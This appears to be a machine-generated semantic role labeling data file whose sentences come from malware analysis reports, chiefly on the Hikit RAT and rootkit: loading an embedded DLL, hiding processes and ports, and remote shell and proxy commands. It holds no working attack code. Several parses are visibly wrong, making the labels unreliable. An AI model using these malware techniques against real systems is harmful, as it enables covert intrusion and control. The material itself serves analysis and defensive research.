IPs"}}, "monitor": {"ARG0": {"text": "attackers"}, "V": {"text": "monitor", "index": 4}, "ARG1": {"text": "all traffic"}, "ARG2": {"text": "to specific IPs"}}}, " Once\nloaded, the code can obtain context as described\nin Listing 4, or call DexClassLoaderload<fn>12</fn> to\ninject new classes from the attackers\u2019 DEX\nfiles to register callbacks to take pictures/\nrecord videos": {"can": {"V": {"text": "can", "index": 5}}, "obtain": {"ARGM-TMP": {"text": "Once loaded"}, "ARG0": {"text": "the code"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "obtain", "index": 6}, "ARG1": {"text": "context"}, "ARGM-MNR": {"text": "as described in Listing 4"}, "ARGM-PRP": {"text": "to register callbacks to take pictures/ record videos"}}, "described": {"V": {"text": "described", "index": 9}, "ARG2": {"text": "in Listing 4"}}, "call": {"ARGM-TMP": {"text": "Once loaded"}, "ARG0": {"text": "the code"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "call", "index": 15}, "ARG1": {"text": "DexClassLoaderload to inject"}, "ARG2": {"text": "from the attackers \u2019 DEX files"}, "ARGM-PRP": {"text": "to register callbacks to take pictures/ record videos"}}, "inject": {"ARG0": {"text": "call DexClassLoaderload"}, "V": {"text": "inject", "index": 18}, "ARG1": {"text": "new classes"}, "ARG2": {"text": "from the attackers \u2019 DEX files"}}, "register": {"V": {"text": "register", "index": 28}, "ARG1": {"text": "callbacks"}, "ARG2": {"text": "to take pictures/ record videos"}}, "take": {"V": {"text": "take", "index": 31}, "ARG1": {"text": "pictures/ record videos"}}}, "\n</section>\n\n<section>\nBack to square one:\n\nFrom what we have seen so far, the malware is being delivered as a Microsoft Office Word (.doc) email\nattachment, containing a malicious macro called AutoOpen": {"have": {"V": {"text": "have", "index": 8}}, "seen": {"ARG1": {"text": "what"}, "ARG0": {"text": "we"}, "V": {"text": "seen", "index": 9}, "ARGM-TMP": {"text": "so far"}}, "is": {"V": {"text": "is", "index": 15}}, "being": {"V": {"text": "being", "index": 16}}, "delivered": {"ARGM-ADV": {"text": "From what we have seen so far"}, "ARG1": {"text": "the malware"}, "V": {"text": "delivered", "index": 17}, "ARGM-MNR": {"text": "as a Microsoft Office Word ( .doc ) email attachment"}, "ARGM-PRD": {"text": "containing a malicious macro called AutoOpen"}}, "containing": {"V": {"text": "containing", "index": 29}, "ARG1": {"text": "a malicious macro called AutoOpen"}}, "called": {"ARG1": {"text": "a malicious macro"}, "V": {"text": "called", "index": 33}, "ARG2": {"text": "AutoOpen"}}}, "\n\nAs seen, the malware uses a number of RATs to control its victims or track their activity": {"seen": {"V": {"text": "seen", "index": 1}}, "uses": {"ARGM-ADV": {"text": "As seen"}, "ARG0": {"text": "the malware"}, "V": {"text": "uses", "index": 5}, "ARG1": {"text": "a number of RATs"}, "ARG2": {"text": "to control its victims or track their activity"}}, "control": {"ARG0": {"text": "the malware"}, "V": {"text": "control", "index": 11}, "ARG1": {"text": "its victims"}}, "track": {"ARG0": {"text": "a number"}, "V": {"text": "track", "index": 15}, "ARG1": {"text": "their activity"}}}, " Stolen data was packed and sent encrypted over HTTP\nrandom ports": {"Stolen": {"V": {"text": "Stolen", "index": 0}, "ARG1": {"text": "data"}}, "was": {"V": {"text": "was", "index": 2}, "ARG2": {"text": "packed"}}, "packed": {"ARG1": {"text": "Stolen data"}, "V": {"text": "packed", "index": 3}}, "sent": {"ARG1": {"text": "Stolen data"}, "V": {"text": "sent", "index": 5}, "ARGM-MNR": {"text": "encrypted"}, "ARGM-ADV": {"text": "over HTTP random ports"}}, "encrypted": {"V": {"text": "encrypted", "index": 6}}}, "\n\nThe malware is in plain view, modifying commonplace registry entries, such as the startup configurations,\nand not covering its tracks": {"is": {"ARG1": {"text": "The malware"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "in plain view"}, "C-ARG1": {"text": "modifying commonplace registry entries , such as the startup configurations , and not covering its tracks"}}, "modifying": {"ARG0": {"text": "The malware"}, "V": {"text": "modifying", "index": 7}, "ARG1": {"text": "commonplace registry entries , such as the startup configurations"}}, "covering": {"ARGM-NEG": {"text": "not"}, "V": {"text": "covering", "index": 20}, "ARG1": {"text": "its tracks"}}}, " The RAT functionality provides an attacker with the ability to\nestablish a phantom network within a victim\u2019s infrastructure by having individual instances of Gen 2 DLL\nlisten for incoming connections on local ports (presumably, NAT\u2019d ports) and accept commands from\nthe inbound connection": {"provides": {"ARG0": {"text": "The RAT functionality"}, "V": {"text": "provides", "index": 3}, "ARG1": {"text": "an attacker with the ability to establish a phantom network within a victim \u2019s infrastructure by having individual instances of Gen 2 DLL listen for incoming connections on local ports ( presumably , NAT\u2019d ports ) and accept commands from the inbound connection"}}, "establish": {"V": {"text": "establish", "index": 10}, "ARG1": {"text": "a phantom network"}, "ARGM-LOC": {"text": "within a victim \u2019s infrastructure"}, "ARGM-MNR": {"text": "by having individual instances of Gen 2 DLL listen for incoming connections on local ports ( presumably"}}, "having": {"V": {"text": "having", "index": 20}, "ARG1": {"text": "individual instances of Gen 2 DLL listen for incoming connections on local ports ( presumably"}}, "accept": {"ARG0": {"text": "NAT\u2019d"}, "V": {"text": "accept", "index": 41}, "ARG1": {"text": "commands from the inbound connection"}}}, " It is unclear why this code exists given that the DLL will check\nthe Driver version and correct the Driver if necessary prior to reaching the portion of the code that\nreports the\t\n \u00a0DRIVER_MIN_VERSION.\t\n \u00a0It is possible that the second Driver version check is a last ditch\neffort to ensure the correct Driver is installed": {"is": {"V": {"text": "is", "index": 1}, "ARG2": {"text": "unclear"}, "ARG1": {"text": "why this code exists given that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code that reports the DRIVER_MIN_VERSION . It is possible that the second Driver version check is a last ditch effort to ensure the correct Driver is installed"}}, "exists": {"ARGM-CAU": {"text": "why/ given that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code"}, "ARG1": {"text": "this code"}, "V": {"text": "exists", "index": 6}}, "given": {"ARGM-CAU": {"text": "why"}, "ARG0": {"text": "this code exists"}, "V": {"text": "given", "index": 7}, "ARG1": {"text": "that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code that reports the DRIVER_MIN_VERSION"}}, "will": {"V": {"text": "will", "index": 11}}, "check": {"ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "check", "index": 12}, "ARG1": {"text": "the Driver version"}}, "correct": {"ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "correct", "index": 17}, "ARG1": {"text": "the Driver"}, "ARGM-ADV": {"text": "if necessary"}, "ARGM-TMP": {"text": "prior to reaching the portion of the code that reports the DRIVER_MIN_VERSION"}}, "reaching": {"V": {"text": "reaching", "index": 24}, "ARG1": {"text": "the portion of the code that reports the DRIVER_MIN_VERSION"}}, "reports": {"ARG0": {"text": "the portion of the code"}, "R-ARG0": {"text": "that"}, "V": {"text": "reports", "index": 31}, "ARG1": {"text": "the DRIVER_MIN_VERSION"}}, "is_2": {"V": {"text": "is", "index": 36}, "ARG2": {"text": "possible"}, "ARG1": {"text": "that the second Driver version check is a last ditch effort to ensure the correct Driver is installed"}}, "is_3": {"ARG1": {"text": "the second Driver version check"}, "V": {"text": "is", "index": 44}, "ARG2": {"text": "a last ditch effort to ensure the correct Driver is installed"}}, "ensure": {"V": {"text": "ensure", "index": 50}, "ARG1": {"text": "the correct Driver is installed"}}, "is_4": {"V": {"text": "is", "index": 54}}, "installed": {"ARG1": {"text": "the correct Driver"}, "V": {"text": "installed", "index": 55}}}, "<doc>                                                                                                            \t\n \u00a0\n\t\n \u00a0\n<section>\n<heading>Hikit Analysis</heading>\n</section>\n<section>\n<heading>Basic Description</heading>\nHikit consists of at least two generations of malware that provides basic RAT functionality": {"consists": {"ARG1": {"text": "Hikit"}, "V": {"text": "consists", "index": 1}, "ARG2": {"text": "of at least two generations of malware that provides basic RAT functionality"}}, "provides": {"ARG0": {"text": "malware"}, "R-ARG0": {"text": "that"}, "V": {"text": "provides", "index": 10}, "ARG1": {"text": "basic RAT functionality"}}}, " In order for the\nDLL to load, Gen 2 (starting with Gen 2.1) uses a loader application (referred to simply as \u201cthe\nLoader\u201d)": {"load": {"ARG0": {"text": "the DLL"}, "V": {"text": "load", "index": 6}}, "starting": {"ARG0": {"text": "Gen 2 ("}, "V": {"text": "starting", "index": 11}, "ARGM-MNR": {"text": "with Gen 2.1 )"}}, "uses": {"ARGM-PRP": {"text": "In order for the DLL to load"}, "ARG0": {"text": "Gen 2 ( starting with Gen 2.1 )"}, "V": {"text": "uses", "index": 16}, "ARG1": {"text": "a loader application ( referred"}, "ARG2": {"text": "to simply as \u201c the Loader \u201d )"}}, "referred": {"ARG1": {"text": "a loader application"}, "V": {"text": "referred", "index": 21}, "R-ARG1": {"text": "to"}, "ARG2": {"text": "simply as \u201c the Loader \u201d )"}}}, "\n</section>\n<section>\n<heading>Gen 2 Driver</heading>\nThe Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (\u201cthe Driver\u201d) to\nhide aspects of the DLL\u2019s functionality from normal system processes": {"beginning": {"ARG1": {"text": "The Gen 2 sub - family"}, "V": {"text": "beginning", "index": 7}, "ARGM-MNR": {"text": "with Gen 2.0 Beta"}}, "employs": {"ARG0": {"text": "The Gen 2 sub - family"}, "ARGM-ADV": {"text": "beginning with Gen 2.0 Beta"}, "V": {"text": "employs", "index": 13}, "ARG1": {"text": "a Windows device driver ( \u201c the Driver \u201d ) to hide aspects of the DLL \u2019s functionality from normal system processes"}}, "hide": {"ARG0": {"text": "The Gen 2 sub - family"}, "V": {"text": "hide", "index": 25}, "ARG1": {"text": "aspects of the DLL \u2019s functionality from normal system processes"}}}, "\n        0x22FFFC                                                                                                             Purge all hooks and hidden items (\"unhook\")\n</table>\nThe Driver is capable of hiding processes (by PID, not name), system modules, services, network\nconnections, listening ports, directories (and by extension, files), as well as registry keys and values": {"hidden": {"V": {"text": "hidden", "index": 5}, "ARG1": {"text": "items"}}, "is": {"ARG1": {"text": "The Driver"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "capable of hiding processes ( by PID , not name ) , system modules , services , network connections , listening ports , directories ( and by extension , files ) , as well as registry keys and values"}}}, " The remote shell function uses\nthe standard pipe redirection method for interfacing a network application (in this case, the DLL) to a\nhidden command shell.\t\n</section>\n \u00a0\n<section>\n<heading>Command: \u00a0file </heading>\u00a0\nThe\t\n \u00a0file\t\n \u00a0command provides an attacker with a variety of disk access options such as listing\ndirectories, changing the current directory, and uploading and downloading files": {"uses": {"ARG0": {"text": "The remote shell function"}, "V": {"text": "uses", "index": 4}, "ARG1": {"text": "the standard pipe redirection method"}, "ARG2": {"text": "for interfacing a network application ( in this case"}}, "interfacing": {"V": {"text": "interfacing", "index": 11}, "ARG1": {"text": "a network application ("}, "ARGM-LOC": {"text": "in this case"}}, "provides": {"ARG0": {"text": "The file command"}, "V": {"text": "provides", "index": 32}, "ARG1": {"text": "an attacker with a variety of disk access options such as listing directories , changing the current directory , and uploading and downloading files"}}, "listing": {"V": {"text": "listing", "index": 44}, "ARG1": {"text": "directories"}}, "changing": {"V": {"text": "changing", "index": 47}, "ARG1": {"text": "the current directory"}}, "uploading": {"V": {"text": "uploading", "index": 53}}, "downloading": {"V": {"text": "downloading", "index": 55}, "ARG1": {"text": "files"}}}, " The difference between the two exports is that DllRegisterServer\t\n \u00a0can take an\noptional command line argument of the letter \u201cu\u201d which will instruct the main thread to uninstall the Gen\n1 system from a victim\u2019s computer": {"is": {"ARG1": {"text": "The difference between the two exports"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "that DllRegisterServer can take an optional command line argument of the letter \u201c u \u201d which will instruct the main thread to uninstall the Gen 1 system from a victim \u2019s computer"}}, "can": {"V": {"text": "can", "index": 9}}, "take": {"ARG0": {"text": "DllRegisterServer"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "take", "index": 10}, "ARG1": {"text": "an optional command line argument of the letter \u201c u \u201d which will instruct the main thread to uninstall the Gen 1 system from a victim \u2019s computer"}}, "will": {"ARG0": {"text": "the letter \u201c u \u201d"}, "R-ARG0": {"text": "which"}, "V": {"text": "will", "index": 23}, "ARG1": {"text": "instruct the main thread to uninstall the Gen 1 system from a victim \u2019s computer"}}, "instruct": {"ARG0": {"text": "the letter \u201c u \u201d"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "instruct", "index": 24}, "ARG1": {"text": "the main thread to uninstall the Gen 1 system from a victim \u2019s computer"}}, "uninstall": {"V": {"text": "uninstall", "index": 29}, "ARG1": {"text": "the Gen 1 system from a victim \u2019s computer"}}}, " The dwHikitVersion\t\nfield allows the client and\nthe DLL to ensure that they have a compatible communication scheme in place prior to executing\ncommands": {"allows": {"ARG0": {"text": "The dwHikitVersion field"}, "V": {"text": "allows", "index": 3}, "ARG1": {"text": "the client and the DLL to ensure that they have a compatible communication scheme in place prior to executing commands"}}, "ensure": {"ARG0": {"text": "the client and the DLL"}, "V": {"text": "ensure", "index": 10}, "ARG1": {"text": "that they have a compatible communication scheme in place prior to executing commands"}}, "have": {"ARG0": {"text": "they"}, "V": {"text": "have", "index": 13}, "ARG1": {"text": "a compatible communication scheme"}, "ARGM-LOC": {"text": "in place"}, "ARGM-TMP": {"text": "prior to executing commands"}}, "executing": {"ARG0": {"text": "they"}, "V": {"text": "executing", "index": 22}, "ARG1": {"text": "commands"}}}, " Despite the\ndifferent models, both variants of the Loader load the embedded DLL in the exact same way": {"embedded": {"V": {"text": "embedded", "index": 12}, "ARG1": {"text": "DLL"}}}, " The standalone Loaders use\nthe\t\nMatrixMain\t\nfunction while the DLL Loaders will call the\t\nStartServer\t\nfunction": {"use": {"ARG0": {"text": "The standalone Loaders"}, "V": {"text": "use", "index": 3}, "ARG1": {"text": "the MatrixMain function"}, "ARGM-TMP": {"text": "while the DLL Loaders will call the StartServer function"}}, "will": {"V": {"text": "will", "index": 11}}, "call": {"ARG0": {"text": "the DLL Loaders"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "call", "index": 12}, "ARG1": {"text": "the StartServer"}}}, "\n\t\n \u00a0\n</table>\nIf the i\t\n \u00a0parameter is given, the DLL will install itself as a service on the victim\u2019s machine": {"is": {"V": {"text": "is", "index": 4}}, "given": {"ARG1": {"text": "the i parameter"}, "V": {"text": "given", "index": 5}}, "will": {"ARGM-ADV": {"text": "If the i parameter is given"}, "ARG0": {"text": "the DLL"}, "V": {"text": "will", "index": 9}, "ARG1": {"text": "install itself as a service on the victim \u2019s machine"}}, "install": {"ARGM-ADV": {"text": "If the i parameter is given"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 10}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as a service on the victim \u2019s machine"}}}, " With the handle open to the rootkit driver, the RAT\nfunctionality code deletes the service in order to reduce the visible footprint of the new driver": {"deletes": {"ARGM-ADV": {"text": "With the handle open to the rootkit driver"}, "ARG0": {"text": "the RAT functionality code"}, "V": {"text": "deletes", "index": 13}, "ARG1": {"text": "the service"}, "ARGM-PRP": {"text": "in order to reduce the visible footprint of the new driver"}}, "reduce": {"V": {"text": "reduce", "index": 19}, "ARG1": {"text": "the visible footprint of the new driver"}}}, " To further\nreduce the footprint of the driver, the RAT functionality code also uses the cloaking functionality of the\nrootkit to hide the DLL\u2019s PID, any references to the GUID {4AE26357-79A3-466D-A6D9-\nFC38BFB67DEA}, the DLL\u2019s service names (e.g": {"reduce": {"ARG2": {"text": "further"}, "V": {"text": "reduce", "index": 2}, "ARG1": {"text": "the footprint of the driver"}, "ARG0": {"text": "the RAT functionality code"}}, "uses": {"ARGM-PRP": {"text": "To further reduce the footprint of the driver"}, "ARG0": {"text": "the RAT functionality code"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "uses", "index": 14}, "ARG1": {"text": "the cloaking functionality of the rootkit"}, "ARG2": {"text": "to hide the DLL \u2019s PID , any references to the GUID { 4AE26357 - 79A3 - 466D - A6D9- FC38BFB67DEA } , the DLL \u2019s service names ( e.g"}}, "hide": {"ARG0": {"text": "the RAT functionality code"}, "V": {"text": "hide", "index": 22}, "ARG1": {"text": "the DLL \u2019s PID , any references to the GUID { 4AE26357 - 79A3 - 466D - A6D9- FC38BFB67DEA } , the DLL \u2019s service names ( e.g"}}}, " The\nDriver also creates a symbolic link to the device using the same name but under the\t\n\\DosDevices\\\t\n\ntree.\t\u00a0\t\n\nFor reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide\nnetwork connections on Windows Vista and later decided to keep the example IP address within the\ncode": {"creates": {"ARG0": {"text": "The Driver"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "creates", "index": 3}, "ARG1": {"text": "a symbolic link to the device using the same name"}}, "using": {"ARG0": {"text": "a symbolic"}, "V": {"text": "using", "index": 10}, "ARG1": {"text": "the same name"}}, "used": {"ARGM-LOC": {"text": "under the \\DosDevices\\ tree"}, "ARGM-CAU": {"text": "For reasons unknown"}, "ARG0": {"text": "the authors of the Driver"}, "V": {"text": "used", "index": 29}, "ARG1": {"text": "code"}, "ARG2": {"text": "from a Chinese blog that details how to hide network connections on Windows Vista and later decided to keep the example IP address within the"}}, "details": {"ARG0": {"text": "a Chinese blog"}, "R-ARG0": {"text": "that"}, "V": {"text": "details", "index": 36}, "ARG1": {"text": "how to hide network connections on Windows Vista"}}, "hide": {"ARGM-MNR": {"text": "how"}, "V": {"text": "hide", "index": 39}, "ARG1": {"text": "network connections on Windows Vista"}}, "decided": {"ARGM-MNR": {"text": "how"}, "ARGM-TMP": {"text": "later"}, "V": {"text": "decided", "index": 47}, "ARG1": {"text": "to keep the example IP address within the code"}}, "keep": {"V": {"text": "keep", "index": 49}, "ARG1": {"text": "the example IP address within the code"}}}, "\n</section>\n<section>\n<heading>Command: \u00a0proxy (Gen 1.2 and later), socks5 \u00a0(Gen 1.0 and 1.1) \u00a0</heading>\nThe\t\n \u00a0proxy\t\n \u00a0(or\t\n \u00a0socks5) command allows an attacker to utilize a Hikit-infected machine as a proxy": {"allows": {"ARG0": {"text": "The proxy ( or socks5 ) command"}, "V": {"text": "allows", "index": 7}, "ARG1": {"text": "an attacker to utilize a Hikit - infected machine as a proxy"}}, "utilize": {"ARG0": {"text": "an attacker"}, "V": {"text": "utilize", "index": 11}, "ARG1": {"text": "a Hikit - infected machine"}, "ARGM-PRD": {"text": "as a proxy"}}, "infected": {"ARG2": {"text": "Hikit"}, "V": {"text": "infected", "index": 15}, "ARG1": {"text": "machine"}}}, " In\norder to hide these items, the Driver hooks various Windows Kernel API calls": {"hide": {"V": {"text": "hide", "index": 3}, "ARG1": {"text": "these items"}}, "hooks": {"ARGM-PRP": {"text": "In order to hide these items"}, "ARG1": {"text": "the Driver"}, "V": {"text": "hooks", "index": 9}, "ARG2": {"text": "various Windows Kernel API calls"}}, "calls": {"ARGM-PRP": {"text": "In order to hide these items"}, "ARG0": {"text": "the Driver hooks various Windows Kernel API"}, "V": {"text": "calls", "index": 14}}}, " port forwarding) through\n                                  another Hikit sample\n       socks5        Gen 1.0      Establishes a forwarding proxy (retired in Gen 1.2)\n       proxy         Gen 1.2      Establishes a forwarding proxy\n       information   Gen 2.0      Returns the configuration for the Hikit infection\n                     Alpha\n       exit          Gen 1.0      Terminates a channel\n</table>\n</section>\n<section>\n<heading>Command: \u00a0shell \u00a0</heading>\nThe\t\n \u00a0shell\t\n \u00a0command activates a remote shell on the victim\u2019s computer": {"forwarding": {"ARG0": {"text": "port"}, "V": {"text": "forwarding", "index": 1}, "ARG1": {"text": ")"}, "ARGM-MNR": {"text": "through another Hikit"}}, "Gen": {"ARG1": {"text": "Hikit sample socks5"}, "V": {"text": "Gen", "index": 8}}, "forwarding_2": {"V": {"text": "forwarding", "index": 12}, "ARG1": {"text": "proxy ( retired"}}, "retired": {"ARG0": {"text": "a forwarding proxy ("}, "V": {"text": "retired", "index": 15}, "ARG1": {"text": "in Gen 1.2 ) proxy"}}, "forwarding_3": {"V": {"text": "forwarding", "index": 25}, "ARG1": {"text": "proxy information"}}, "Gen_2": {"ARG1": {"text": "the Hikit infection/ Alpha exit"}, "V": {"text": "Gen", "index": 39}}, "activates": {"ARG0": {"text": "The shell command"}, "V": {"text": "activates", "index": 47}, "ARG1": {"text": "a remote shell"}}}, "\n</section>\n<section>\n<heading>Functionality and Commands</heading>\nThe Hikit family has supported roughly the same set of commands since the first known samples of\nGen 1.0": {"has": {"V": {"text": "has", "index": 3}}, "supported": {"ARG0": {"text": "The Hikit family"}, "V": {"text": "supported", "index": 4}, "ARG1": {"text": "roughly the same set of commands"}, "ARGM-TMP": {"text": "since the first known samples of Gen 1.0"}}, "known": {"ARGM-TMP": {"text": "first"}, "V": {"text": "known", "index": 14}, "ARG1": {"text": "samples"}}}, "\n<code>\n        struct ImageHeader\n        {\n           DWORD dwImageEncodedSize;\n           DWORD dwImageSizeDecompressed;\n           DWORD EncodingKey;\n        };\n</code>\n\nLoadEmbeddedImage\t\n \u00a0copies the compressed embedded DLL into a newly allocated heap buffer and\nthen calls the function\t\n \u00a0decodeBuffer\t\n \u00a0(using the\t\n \u00a0EncodingKey\t\n \u00a0value) to decrypt the embedded DLL": {"copies": {"ARG0": {"text": "LoadEmbeddedImage"}, "V": {"text": "copies", "index": 1}, "ARG1": {"text": "the compressed embedded DLL"}, "ARG2": {"text": "into a newly allocated heap buffer"}}, "compressed": {"V": {"text": "compressed", "index": 3}, "ARG1": {"text": "embedded DLL"}}, "embedded": {"V": {"text": "embedded", "index": 4}, "ARG1": {"text": "DLL"}}, "allocated": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "allocated", "index": 9}, "ARG1": {"text": "heap buffer"}}, "calls": {"ARGM-TMP": {"text": "then"}, "V": {"text": "calls", "index": 14}, "ARG1": {"text": "the function decodeBuffer"}}, "using": {"V": {"text": "using", "index": 19}, "ARG1": {"text": "the EncodingKey value )"}, "ARG2": {"text": "to decrypt the embedded"}}, "decrypt": {"V": {"text": "decrypt", "index": 25}, "ARG1": {"text": "the embedded DLL"}}, "embedded_2": {"V": {"text": "embedded", "index": 27}, "ARG1": {"text": "DLL"}}}, "\n\nAfter loading the embedded DLL image into memory, the Loader will either call the DLL\u2019s\t\n\nStartServer\t\nor\t\nMatrixMain\t\nfunction depending on the type of Loader": {"loading": {"V": {"text": "loading", "index": 1}, "ARG1": {"text": "the embedded DLL image"}, "ARG2": {"text": "into memory"}, "ARG0": {"text": "the Loader"}}, "embedded": {"V": {"text": "embedded", "index": 3}, "ARG1": {"text": "DLL image"}, "ARG2": {"text": "into memory"}}, "will": {"ARGM-TMP": {"text": "After loading the embedded DLL image into memory"}, "V": {"text": "will", "index": 11}}, "call": {"ARGM-TMP": {"text": "After loading the embedded DLL image into memory"}, "ARG0": {"text": "the Loader"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "call", "index": 13}, "ARG1": {"text": "the DLL"}, "ARG2": {"text": "\u2019s StartServer or MatrixMain function"}, "ARGM-ADV": {"text": "depending on the type of Loader"}}, "depending": {"V": {"text": "depending", "index": 21}, "ARG1": {"text": "on the type of Loader"}}}, " Once connected, the operator has\nthe basic Hikit functionalities available to them via commands such as file and shell": {"connected": {"V": {"text": "connected", "index": 1}}, "has": {"ARGM-TMP": {"text": "Once connected"}, "ARG0": {"text": "the operator"}, "V": {"text": "has", "index": 5}, "ARG1": {"text": "the basic Hikit functionalities available to them via commands such as file and shell"}}}, " The DLL operates as a service, requiring an attacker is install the DLL as a\nservice at some point prior to activation": {"operates": {"ARG1": {"text": "The DLL"}, "V": {"text": "operates", "index": 2}, "ARGM-MNR": {"text": "as a service"}, "ARGM-ADV": {"text": "requiring an attacker is install the DLL as a service at some point prior to activation"}}, "requiring": {"ARG0": {"text": "The DLL"}, "V": {"text": "requiring", "index": 7}, "ARG1": {"text": "an attacker is install the DLL as a service at some point prior to activation"}}, "is": {"V": {"text": "is", "index": 10}}, "install": {"ARG0": {"text": "an attacker"}, "V": {"text": "install", "index": 11}, "ARG1": {"text": "the DLL"}, "ARG2": {"text": "as a service"}, "ARGM-TMP": {"text": "at some point/ prior to activation"}}}, "\nWith the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage\t\n \u00a0calls\t\n \u00a0\nImageLoaderData::LoadDll\t\n \u00a0to manually load the DLL into memory": {"embedded": {"V": {"text": "embedded", "index": 2}, "ARG1": {"text": "DLL"}}, "decompressed": {"ARG1": {"text": "the embedded DLL"}, "ARGM-TMP": {"text": "now"}, "V": {"text": "decompressed", "index": 5}, "ARGM-DIR": {"text": "into a heap buffer"}}, "calls": {"ARGM-ADV": {"text": "With the embedded DLL now decompressed into a heap buffer"}, "ARG0": {"text": "LoadEmbeddedImage"}, "V": {"text": "calls", "index": 12}, "ARG2": {"text": "ImageLoaderData::LoadDll"}, "ARG1": {"text": "to manually load the DLL into memory"}}, "load": {"ARGM-MNR": {"text": "manually"}, "V": {"text": "load", "index": 16}, "ARG1": {"text": "the DLL"}, "ARG2": {"text": "into memory"}}}, " Both versions of the Loader begin by loading the embedded DLL from the Loader\u2019s resources\n(item 102 under the Group Icons resource tree), decrypting and decompressing the image into memory,\nthen manually loading the DLL into memory using a custom loading routine": {"begin": {"ARG1": {"text": "the Loader"}, "V": {"text": "begin", "index": 5}, "ARG0": {"text": "by loading the embedded DLL from the Loader \u2019s resources"}}, "loading": {"V": {"text": "loading", "index": 7}, "ARG1": {"text": "the embedded DLL"}, "ARG2": {"text": "from the Loader \u2019s resources"}}, "embedded": {"V": {"text": "embedded", "index": 9}, "ARG1": {"text": "DLL"}}, "decrypting": {"V": {"text": "decrypting", "index": 27}, "ARG1": {"text": "the"}}, "decompressing": {"V": {"text": "decompressing", "index": 29}, "ARG1": {"text": "the image"}, "ARGM-PRD": {"text": "into memory"}}, "loading_2": {"ARG0": {"text": "Both versions of the Loader begin by loading the embedded DLL from the Loader \u2019s"}, "ARGM-TMP": {"text": "then"}, "ARGM-MNR": {"text": "manually/ using a custom loading routine"}, "V": {"text": "loading", "index": 37}, "ARG1": {"text": "the DLL"}, "ARG2": {"text": "into memory"}}, "using": {"V": {"text": "using", "index": 42}, "ARG1": {"text": "a custom loading routine"}}}, "\nUpon activation, the Driver will expose its interface by calling\t\nIoCreateDevice\t\nwith the name\n\\Device\\agony\t\n(for Gen 2.0 Beta samples), \\Device\\HTTPS\t\n(for Gen 2.1 samples),\t\n\n\\Device\\advcachemgr\t\n(for Gen 2.2 samples) or \\Device\\diskdump\t\n(for Gen 2.3 samples)": {"will": {"ARGM-TMP": {"text": "Upon activation"}, "V": {"text": "will", "index": 5}}, "expose": {"ARGM-TMP": {"text": "Upon activation"}, "ARG0": {"text": "the Driver"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "expose", "index": 6}, "ARG1": {"text": "its interface"}, "ARG2": {"text": "by calling IoCreateDevice with the name \\Device\\agony ( for Gen 2.0 Beta samples )"}}, "calling": {"ARG0": {"text": "the Driver"}, "V": {"text": "calling", "index": 10}, "ARG1": {"text": "IoCreateDevice"}, "ARG2": {"text": "with the name \\Device\\agony ("}, "ARGM-PRP": {"text": "for Gen 2.0 Beta samples )"}}}, " Additionally, the code also attempts to hide a service named \u201cHitx\u201d": {"attempts": {"ARGM-DIS": {"text": "Additionally/ also"}, "ARG0": {"text": "the code"}, "V": {"text": "attempts", "index": 5}, "ARG1": {"text": "to hide a service named \u201c Hitx \u201d"}}, "hide": {"ARG0": {"text": "the code"}, "V": {"text": "hide", "index": 7}, "ARG1": {"text": "a service named \u201c Hitx \u201d"}}, "named": {"ARG1": {"text": "a service"}, "V": {"text": "named", "index": 10}, "ARG2": {"text": "\u201c Hitx \u201d"}}}, " The console is a text based application that takes a Gen 1.0 or Gen 1.2 infection\u2019s IP address\nand proceeds to connect and authenticate with the infected server": {"is": {"ARG1": {"text": "The console"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a text based application that takes a Gen 1.0 or Gen 1.2 infection \u2019s IP address and proceeds to connect and authenticate with the infected server"}}, "based": {"V": {"text": "based", "index": 5}, "ARG1": {"text": "application"}}, "takes": {"ARG0": {"text": "a text based application"}, "R-ARG0": {"text": "that"}, "V": {"text": "takes", "index": 8}, "ARG1": {"text": "a Gen 1.0 or Gen 1.2 infection \u2019s IP address and proceeds"}, "ARGM-PRP": {"text": "to connect and authenticate with the infected server"}}, "Gen": {"ARG0": {"text": "a text based application"}, "R-ARG0": {"text": "that"}, "V": {"text": "Gen", "index": 13}, "ARG1": {"text": "1.2 infection \u2019s IP"}}, "proceeds": {"ARG0": {"text": "a text based application"}, "R-ARG0": {"text": "that"}, "V": {"text": "proceeds", "index": 20}, "ARG1": {"text": "to connect and authenticate with the infected server"}}, "connect": {"V": {"text": "connect", "index": 22}, "ARG1": {"text": "with the infected server"}}, "authenticate": {"V": {"text": "authenticate", "index": 24}, "ARGM-MNR": {"text": "with the infected server"}}}, " The first\ngeneration of Hikit (referred to as \u201cGen 1\u201d) operates as a server and requires an externally exposed\nnetwork interface in order for an attacker to access the victim machine": {"referred": {"ARG0": {"text": "Hikit"}, "V": {"text": "referred", "index": 6}, "ARG1": {"text": "to"}, "ARG2": {"text": "as \u201c Gen 1 \u201d )"}}, "operates": {"ARG1": {"text": "Gen 1 \u201d )"}, "V": {"text": "operates", "index": 14}, "ARG4": {"text": "as a server"}}, "requires": {"ARG0": {"text": "The first generation of Hikit ( referred to as \u201c Gen 1 \u201d )"}, "V": {"text": "requires", "index": 19}, "ARG1": {"text": "an externally exposed network interface"}, "ARGM-PRP": {"text": "in order for an attacker to access the victim machine"}}, "exposed": {"ARG0": {"text": "an externally"}, "V": {"text": "exposed", "index": 22}, "ARG2": {"text": "network interface"}}, "access": 